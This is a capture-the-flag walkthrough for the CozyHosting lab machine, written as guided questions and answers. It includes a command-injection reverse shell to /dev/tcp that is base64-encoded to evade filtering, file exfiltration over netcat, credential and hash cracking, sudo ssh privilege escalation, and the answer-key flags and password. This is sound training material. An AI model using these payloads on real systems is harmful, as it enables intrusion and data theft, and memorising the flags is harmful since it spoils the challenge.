## Guided:
**Q:** How many TCP ports are open on CozyHosting?<br>
**A:** 2

**Q:** The webserver on TCP port 80 issues a redirect to what domain?<br>
**A:** cozyhosting.htb

**Q:** What relative path on the webserver returns a 500 error?<br>
**A:** /error<br>
> Note: the template of the response of it revealed that the app is using spring-boot.<br>

**Q:** What is the Java web framework used in the web application?<br>
**A:** Spring boot

**Q:** What endpoint is exposed in Spring Boot and is mainly used for debugging purposes?<br>
**A:** /actuator<br>
> `find / -name spring* 2>/dev/null` <br>
> `/usr/share/seclists/Discovery/Web-Content/spring-boot.txt` <br> (specific wordlist for it)

**Q:** What is the username of the user's whose session is exposed?<br>
**A:** kanderson<br>
> The end-point that expose it:<br> `http://cozyhosting.htb/actuator/sessions`

**Q:** When a POST request is sent to /executessh,<br> which of the two parameters is vulnerable to command injection?<br>
**A:** username <br>
> By not sending anything it show /bin/bash error,<br> so if type `;` it will show it trying execute ssh command,<br>
> the white-space can be evaded by typing or `${IFS}` or `{something,like,this}|bash`
> so i encoded in base64 the /dev/tcp/<listener> and made sure there is no '+' with double spaces before encode.
> from -> `echo -n "bash  -i    >& /dev/tcp/<IP>/<PORT>     0 >&1   "|base64 -w 0`
> to -> `YmFzaCAgLWkgICAgPiYgL2Rldi90Y3AvPElQPi88UE9SVD4gICAgIDAgPiYxICAg`

**Q:** What user is the web application running as?<br>
**A:** app

**Q:** What is the full path to the Java file that runs the web application?<br>
**A:** /app/cloudhosting-0.0.1.jar<br>
> Transfered it to my comp via netcat,<br> `cat cloudhosting-0.0.1.jar > /dev/tcp/<IP>/<PORT>`
> my comp -> `netcat -nlvp <PORT> > cloudhosting-0.0.1.jar`
> extracted via 7z --> `7z x cloudhosting-0.0.1.jar`

**Q:** What is the name of the file where application-related properties are stored in a Spring Boot application?<br>
**A:** application.properties<br>
> It had postgres creds,<br> logged in and in the 'users' table there was 2 `bcrypt $2*$, Blowfish (Unix)` hashes

**Q:** What is the admin user's password for the web application?<br>
**A:** manchesterunited

**Q:** Submit the flag located in the josh user's home directory.<br>
**A:** 695a610dde545509f72db184dcd16bbf

**Q:** What is the full path of the binary that the josh user can execute on the machine as root?<br>
**A:** /usr/bin/ssh <br>
> [GTFObin](https://gtfobins.github.io/gtfobins/ssh/#sudo)

**Q:** Submit the flag located in the root user's home directory.<br>
**A:** 29c7d63e6269a919c73759dc7d093729

